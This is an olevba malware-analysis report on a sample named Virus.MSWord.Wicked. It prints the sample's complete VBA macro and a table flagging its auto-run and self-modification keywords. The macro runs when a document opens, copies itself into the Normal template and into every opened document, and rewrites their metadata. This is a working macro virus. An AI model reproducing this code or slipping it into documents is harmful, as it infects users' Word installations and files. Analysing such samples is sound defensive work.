olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wicked
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wicked - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const flag = "Çäåñü âèðóñîâ íåò"

Private Sub Document_Open()
Set x1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x2 = NormalTemplate.VBProject.VBComponents.Item(1)

x3 = x1.CodeModule.Find(flag, 1, 1, 10000, 10000)
x4 = x2.CodeModule.Find(flag, 1, 1, 10000, 10000)

If x4 = False Then
    x11 = x1.CodeModule.Lines(1, x1.CodeModule.CountOfLines)
    x2.CodeModule.DeleteLines 1, x2.CodeModule.CountOfLines
    x2.CodeModule.AddFromString x11
    With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "Äîáðûé äîêòîð Àéáîëèò": .Keywords = "": .Comments = "Çëûå âèðóñû çäåñü áîëüøå íå æèâóò è æèòü íå áóäóò": .Execute: End With
    NormalTemplate.Save
End If
If x3 = False Then
    x11 = x2.CodeModule.Lines(1, x2.CodeModule.CountOfLines)
    x1.CodeModule.DeleteLines 1, x1.CodeModule.CountOfLines
    x1.CodeModule.AddFromString x11
    With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "Äîáðûé äîêòîð Àéáîëèò": .Keywords = "": .Comments = "Çëûå âèðóñû çäåñü áîëüøå íå æèâóò è æèòü íå áóäóò": .Execute: End With
    ActiveDocument.Save
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

